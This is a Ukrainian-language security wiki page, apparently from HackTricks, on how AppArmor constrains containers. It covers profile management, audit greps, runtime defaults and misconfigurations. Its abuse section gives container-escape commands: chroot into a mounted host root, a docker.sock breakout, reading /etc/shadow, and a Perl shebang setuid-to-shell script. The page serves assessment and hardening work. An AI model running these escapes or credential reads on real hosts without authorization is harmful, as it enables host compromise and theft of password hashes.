# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Роль в ізоляції контейнерів

AppArmor — це система **Mandatory Access Control**, яка застосовує обмеження за допомогою профілів для окремих програм. На відміну від традиційних перевірок DAC, які значною мірою залежать від власника користувача та групи, AppArmor дає змогу kernel застосовувати політику, пов’язану безпосередньо з процесом. У середовищах контейнерів це важливо, оскільки workload може мати достатньо традиційних привілеїв для спроби виконати дію, але все одно отримати відмову, якщо його профіль AppArmor не дозволяє доступ до відповідного шляху, mount, мережевої поведінки або використання capability.

Найважливіший концептуальний момент полягає в тому, що AppArmor є **path-based**. Він визначає доступ до файлової системи за правилами шляхів, а не за labels, як це робить SELinux. Це робить AppArmor доступним для розуміння та потужним, але також означає, що bind mounts і альтернативні структури шляхів потребують особливої уваги. Якщо той самий вміст host стає доступним за іншим шляхом, фактичний ефект політики може відрізнятися від того, що спочатку очікував оператор.

## Роль в ізоляції контейнерів

Перевірки безпеки контейнерів часто обмежуються capabilities і seccomp, але AppArmor продовжує мати значення після цих перевірок. Уявімо контейнер, який має більше привілеїв, ніж повинен, або workload, якому з операційних причин потрібна була ще одна capability. AppArmor усе одно може обмежити доступ до файлів, поведінку mount, роботу з мережею та шаблони виконання так, щоб зупинити очевидний шлях зловживання. Саме тому вимкнення AppArmor «лише щоб застосунок запрацював» може непомітно перетворити просто ризиковану конфігурацію на таку, що активно експлуатується.

## Лабораторна робота

Щоб перевірити, чи активний AppArmor на host, використайте:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Щоб побачити, під яким користувачем запущено поточний процес контейнера:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Різниця є показовою. У звичайному випадку процес має відображати контекст AppArmor, пов’язаний із профілем, вибраним runtime. У випадку unconfined цей додатковий рівень обмежень зникає.

Також можна перевірити, що саме, на думку Docker, було застосовано:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Використання під час виконання

Docker може застосовувати стандартний або власний профіль AppArmor, якщо хост його підтримує. Podman також може інтегруватися з AppArmor у системах на базі AppArmor, хоча в дистрибутивах, орієнтованих на SELinux, інша MAC-система часто відіграє головну роль. Kubernetes може застосовувати політику AppArmor на рівні workload на вузлах, які фактично підтримують AppArmor. LXC та пов’язані з ним середовища системних контейнерів сімейства Ubuntu також широко використовують AppArmor.

Практичний висновок полягає в тому, що AppArmor — це не «функція Docker». Це функція ядра хоста, яку можуть застосовувати різні runtime. Якщо хост її не підтримує або runtime налаштований на запуск без обмежень, передбачуваного захисту фактично немає.

Для Kubernetes сучасним API є `securityContext.appArmorProfile`. Починаючи з Kubernetes `v1.30`, старі beta-анотації AppArmor вважаються застарілими. На підтримуваних хостах `RuntimeDefault` є профілем за замовчуванням, тоді як `Localhost` вказує на профіль, який уже має бути завантажений на вузлі. Це важливо під час перевірки, оскільки manifest може виглядати сумісним з AppArmor, водночас повністю залежачи від підтримки на вузлі та попередньо завантажених профілів.

Є одна малопомітна, але корисна операційна деталь: явне встановлення `appArmorProfile.type: RuntimeDefault` є суворішим, ніж просте пропускання цього поля. Якщо поле встановлено явно, а вузол не підтримує AppArmor, admission має завершитися помилкою. Якщо поле пропущено, workload може продовжити виконання на вузлі без AppArmor і просто не отримати цей додатковий рівень обмежень. З погляду атакувальника, це вагома причина перевіряти і manifest, і фактичний стан вузла.

На хостах з підтримкою AppArmor у Docker найвідомішим профілем за замовчуванням є `docker-default`. Цей профіль генерується з шаблону AppArmor у Moby і є важливим, оскільки пояснює, чому деякі capability-based PoC все ще не працюють у контейнері за замовчуванням. У загальних рисах `docker-default` дозволяє звичайну роботу мережі, забороняє запис у значну частину `/proc`, забороняє доступ до чутливих частин `/sys`, блокує операції монтування та обмежує ptrace, щоб він не був універсальним примітивом для дослідження хоста. Розуміння цієї базової конфігурації допомагає відрізнити «контейнер має `CAP_SYS_ADMIN`» від «контейнер фактично може використати цю capability проти потрібних мені інтерфейсів ядра».

## Керування профілями

Профілі AppArmor зазвичай зберігаються в `/etc/apparmor.d/`. Поширена схема іменування полягає в заміні скісних рисок у шляху до виконуваного файлу крапками. Наприклад, профіль для `/usr/bin/man` зазвичай зберігається як `/etc/apparmor.d/usr.bin.man`. Ця деталь важлива як для захисту, так і для оцінювання, оскільки після визначення назви активного профілю відповідний файл на хості часто можна швидко знайти.

Корисні команди керування на стороні хоста включають:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Причина, чому ці команди важливі в довіднику з container security, полягає в тому, що вони пояснюють, як профілі фактично створюються, завантажуються, переводяться в режим complain і змінюються після оновлення застосунку. Якщо оператор має звичку переводити профілі в режим complain під час усунення несправностей і забувати відновити enforcement, контейнер може виглядати захищеним у документації, водночас на практиці працюючи значно менш обмежено.

### Створення та оновлення профілів

`aa-genprof` може відстежувати поведінку застосунку та допомагати інтерактивно створювати профіль:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` може згенерувати шаблонний профіль, який згодом можна завантажити за допомогою `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Коли бінарний файл змінюється і політику потрібно оновити, `aa-logprof` може повторно обробити відмови, знайдені в журналах, і допомогти оператору вирішити, дозволити їх чи відхилити:
```bash
sudo aa-logprof
```
### Журнали

Відмови AppArmor часто можна побачити через `auditd`, syslog або такі інструменти, як `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Це корисно з операційного та offensive-погляду. Defenders використовують це для вдосконалення профілів. Attackers використовують це, щоб дізнатися, який саме шлях або операцію заборонено, і чи є AppArmor контролем, що блокує exploit chain.

### Визначення точного файлу профілю

Коли runtime показує конкретне ім’я профілю AppArmor для container, часто корисно зіставити це ім’я з файлом профілю на диску:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Це особливо корисно під час перевірки на стороні host, оскільки усуває розрив між «container повідомляє, що працює під profile `lowpriv`» і «фактичні rules зберігаються в цьому конкретному file, який можна перевірити або перезавантажити».

### Правила з високою цінністю для аудиту

Якщо ви можете прочитати profile, не обмежуйтеся простими рядками `deny`. Деякі типи rules суттєво впливають на те, наскільки корисним буде AppArmor проти спроби container escape:

- `ux` / `Ux`: виконувати цільовий binary без обмежень. Якщо доступний helper, shell або interpreter дозволений через `ux`, це зазвичай перше, що слід перевірити.
- `px` / `Px` і `cx` / `Cx`: виконувати переходи між profiles під час exec. Вони не є автоматично небезпечними, але їх варто перевірити, оскільки перехід може привести до значно ширшого profile, ніж поточний.
- `change_profile`: дозволяє task перемикатися на інший завантажений profile негайно або під час наступного exec. Якщо цільовий profile слабший, це може стати передбаченим escape hatch з обмежувального domain.
- `flags=(complain)`, `flags=(unconfined)` або новіший `flags=(prompt)`: це має впливати на рівень довіри до profile. `complain` записує denials у log замість їх enforcement, `unconfined` усуває boundary, а `prompt` залежить від decision path у userspace, а не від чистого deny, enforced kernel.
- `userns` або `userns create,`: новіша AppArmor policy може контролювати створення user namespaces. Якщо container profile явно дозволяє це, вкладені user namespaces залишаються можливими, навіть коли platform використовує AppArmor як частину своєї стратегії hardening.

Корисний grep на стороні host:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Такий аудит часто корисніший, ніж перегляд сотень звичайних правил для файлів. Якщо breakout залежить від виконання helper, входу в новий namespace або escaping до менш обмежувального профілю, відповідь часто прихована саме в цих правилах, орієнтованих на переходи, а не в очевидних рядках на кшталт `deny /etc/shadow r`.

## Неправильні конфігурації

Найочевидніша помилка — `apparmor=unconfined`. Адміністратори часто встановлюють цей параметр під час налагодження application, яка не працювала через те, що профіль правильно блокував щось небезпечне або неочікуване. Якщо цей прапорець залишається у production, весь MAC layer фактично видалено.

Інша непомітна проблема — припущення, що bind mounts безпечні, оскільки permissions файлів виглядають нормально. Оскільки AppArmor працює на основі paths, надання доступу до host paths через альтернативні mount locations може некоректно взаємодіяти з path rules. Третя помилка — забувати, що ім'я профілю в config file мало що означає, якщо host kernel фактично не застосовує AppArmor.

## Зловживання

Коли AppArmor відсутній, операції, які раніше були обмежені, можуть раптово почати працювати: читання sensitive paths через bind mounts, доступ до частин procfs або sysfs, використання яких мало бути складнішим, виконання mount-related actions, якщо capabilities/seccomp також це дозволяють, або використання paths, які профіль зазвичай забороняє. AppArmor часто є механізмом, який пояснює, чому спроба breakout на основі capabilities «мала б спрацювати» на папері, але все одно завершується невдачею на практиці. Видаліть AppArmor — і та сама спроба може почати працювати.

Якщо ви підозрюєте, що AppArmor є головною перешкодою для path-traversal, bind-mount або mount-based abuse chain, першим кроком зазвичай є порівняння того, що стає доступним із профілем і без нього. Наприклад, якщо host path змонтовано всередині container, спочатку перевірте, чи можете ви перейти до нього та прочитати його:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Якщо контейнер також має небезпечну capability, таку як `CAP_SYS_ADMIN`, одним із найпрактичніших тестів є перевірка того, чи є AppArmor контролем, що блокує операції монтування або доступ до чутливих файлових систем ядра:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
У середовищах, де шлях хоста вже доступний через bind mount, втрата AppArmor також може перетворити проблему розкриття інформації лише для читання на прямий доступ до файлів хоста:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Суть цих команд не в тому, що AppArmor самостійно створює breakout. Вона в тому, що після видалення AppArmor багато шляхів зловживання файловою системою та монтуваннями стають одразу доступними для тестування.

### Повний приклад: AppArmor вимкнено + коренева файлова система хоста змонтована

Якщо контейнер уже має кореневу файлову систему хоста, підключену через bind mount до `/host`, видалення AppArmor може перетворити заблокований шлях зловживання файловою системою на повний escape з хоста:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Щойно shell починає виконуватися через файлову систему хоста, workload фактично виходить за межі контейнера:
```bash
id
hostname
cat /etc/shadow | head
```
### Повний приклад: AppArmor вимкнено + Runtime Socket

Якщо справжнім бар’єром був AppArmor навколо стану runtime, змонтованого сокета може бути достатньо для повного escape:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Точний шлях залежить від точки монтування, але кінцевий результат однаковий: AppArmor більше не перешкоджає доступу до runtime API, а runtime API може запустити контейнер, що компрометує host.

### Повний приклад: обхід захисту за допомогою bind-mount на основі шляхів

Оскільки AppArmor працює на основі шляхів, захист `/proc/**` не забезпечує автоматичний захист того самого вмісту host procfs, якщо він доступний через інший шлях:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Вплив залежить від того, що саме змонтовано і чи обходить альтернативний шлях також інші засоби контролю, але цей шаблон є однією з найочевидніших причин, чому AppArmor потрібно оцінювати разом зі схемою монтування, а не ізольовано.

### Повний приклад: Shebang Bypass

Політика AppArmor іноді націлена на шлях до інтерпретатора таким чином, що не повністю враховує виконання скриптів через обробку shebang. Історичний приклад передбачав використання скрипту, перший рядок якого вказує на інтерпретатор з обмеженнями:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Такий приклад важливий як нагадування про те, що намір профілю та фактична семантика виконання можуть відрізнятися. Під час перевірки AppArmor у середовищах контейнерів особливу увагу слід приділяти ланцюжкам інтерпретаторів і альтернативним шляхам виконання.

## Перевірки

Мета цих перевірок — швидко отримати відповіді на три запитання: чи увімкнено AppArmor на хості, чи обмежено поточний процес і чи справді runtime застосував профіль до цього контейнера?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Що тут важливо:

- Якщо `/proc/self/attr/current` показує `unconfined`, навантаження не отримує переваг ізоляції AppArmor.
- Якщо `aa-status` показує, що AppArmor вимкнено або не завантажено, будь-яке ім'я профілю в конфігурації runtime здебільшого є косметичним.
- Якщо `docker inspect` показує `unconfined` або неочікуваний custom profile, це часто є причиною, через яку спрацьовує шлях зловживання файловою системою або mount-based abuse.
- Якщо `/sys/kernel/security/apparmor/profiles` не містить очікуваного профілю, самої конфігурації runtime або orchestrator недостатньо.
- Якщо нібито hardened profile містить правила на кшталт `ux`, широкого `change_profile`, `userns` або `flags=(complain)`, практична межа може бути значно слабшою, ніж передбачає назва профілю.

Якщо контейнер уже має підвищені привілеї з операційних причин, залишення AppArmor увімкненим часто визначає різницю між контрольованим винятком і значно ширшим порушенням безпеки.

## Типові налаштування Runtime

| Runtime / платформа | Стан за замовчуванням | Поведінка за замовчуванням | Поширене ручне послаблення |
| --- | --- | --- | --- |
| Docker Engine | Увімкнено за замовчуванням на хостах із підтримкою AppArmor | Використовує профіль AppArmor `docker-default`, якщо його не перевизначено | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Залежить від хоста | AppArmor підтримується через `--security-opt`, але точна поведінка за замовчуванням залежить від хоста/runtime і є менш універсальною, ніж документований профіль Docker `docker-default` | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Умовне значення за замовчуванням | Якщо `appArmorProfile.type` не вказано, використовується `RuntimeDefault`, але лише якщо AppArmor увімкнено на вузлі | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` зі слабким профілем, вузли без підтримки AppArmor |
| containerd / CRI-O під Kubernetes | Залежить від підтримки вузла/runtime | Поширені runtime, підтримувані Kubernetes, підтримують AppArmor, але фактичне застосування все одно залежить від підтримки вузла та налаштувань workload | Те саме, що й у рядку Kubernetes; пряма конфігурація runtime також може повністю пропустити AppArmor |

Для AppArmor найважливішою змінною часто є саме **хост**, а не лише runtime. Налаштування профілю в manifest не створює ізоляцію на вузлі, де AppArmor не увімкнено.

## Посилання

- [Контекст безпеки Kubernetes: поля профілю AppArmor і поведінка за наявності підтримки вузла](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Manpage `apparmor.d(5)` для Ubuntu 24.04: переходи exec, `change_profile`, `userns` і прапорці профілю](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
